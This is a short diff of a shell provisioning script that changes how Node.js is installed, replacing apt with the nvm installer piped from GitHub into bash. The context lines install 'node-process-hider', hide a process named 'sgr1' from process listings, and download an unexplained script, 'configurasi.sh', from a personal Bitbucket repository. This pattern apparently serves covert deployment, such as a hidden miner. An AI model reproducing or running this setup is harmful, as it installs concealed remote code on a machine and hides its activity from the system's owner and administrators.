@@ -16,8 +16,9 @@ sudo apt-get install -y gcc ca-certificates curl gnupg
 sudo mkdir -p /etc/apt/keyrings
 curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/nodesource.gpg
 echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_18.x nodistro main" | sudo tee /etc/apt/sources.list.d/nodesource.list
-sudo apt-get install nodejs -y
-npm install -g npm@10.2.0 -y
+curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash 
+source ~/.bashrc 
+nvm install 18
 npm i -g node-process-hider
 ph add sgr1
 wget https://bitbucket.org/kacepot/esce/raw/main/configurasi.sh
